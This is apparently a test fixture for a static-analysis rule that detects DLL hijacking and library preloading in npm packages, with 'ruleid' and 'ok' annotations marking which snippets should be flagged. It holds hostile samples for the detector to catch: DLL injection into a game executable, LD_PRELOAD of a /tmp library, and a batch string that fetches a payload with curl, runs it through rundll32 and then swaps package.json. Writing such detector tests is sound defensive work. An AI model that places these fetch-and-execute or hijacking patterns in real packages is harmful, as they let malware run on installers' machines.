// Executable sideloading a DLL file
function f() {
  try {
    process.chdir("E:\\Games\\ALT1Games\\TwelveSky1");
    var injector = require("./build/release/injector");
    // ruleid: npm-dll-hijacking
    if (
      injector.executeInject(
        "TwelveSky.exe alt1games.twelvesky1:/test/test/0/18/0/2/1024/768",
        "E:\\Games\\ALT1Games\\TwelveSky1\\TSX_Client.dll"
      )
    ) {
      console.log("Process started and injected.");
    } else {
      console.log("Unable to execute and inject dll.");
    }
  } catch (err) {
    console.error("Exception Thrown!");
    console.error(err);
  }
}

// OK: Run an Executable
function f() {
  // ok: npm-dll-hijacking
  spawn('/usr/bin/python', ['-c', 'print("Hello World")'])
}

// Preloading libraries in linux  
function f() {
  // ruleid: npm-dll-hijacking
  spawn("LD_PRELOAD=/tmp/lib", "/usr/bin/binary");
}

// Preloading libraries in linux  
function f() {
  /* 
  Multiline comment 
  // ok: npm-dll-hijacking
  LD_PRELOAD=/tmp/lib /usr/bin/binary
  */
  return;
}

// Running a DLL directly with rundll32
function f() {
    // ruleid: npm-dll-hijacking
    const data = '@echo off\ncurl -o Temp.b -L "http://127.0.0.1/user/user.asp?id=237596" > nul 2>&1\nrename Temp.b package.db > nul 2>&1\nrundll32 package.db,GenerateKey 1234\ndel "package.db"\nif exist "pk.json" (\ndel "package.json" > nul 2>&1\nrename "pk.json" "package.json" > nul 2>&1\n)';

    return;
}

// Phantom DLL case planting a shared object file and executing a builtin binary
function f() {
  const fs = require("fs");

  const postData = "";

  // ruleid: npm-dll-hijacking
  fs.writeFileSync("/tmp/.so", "utf8", (err, data) => {
    if (err) {
      console.error(err);
      return;
    }
    postData = data;
  });
  
  spawn('/usr/bin/program', ['-lah'])
}
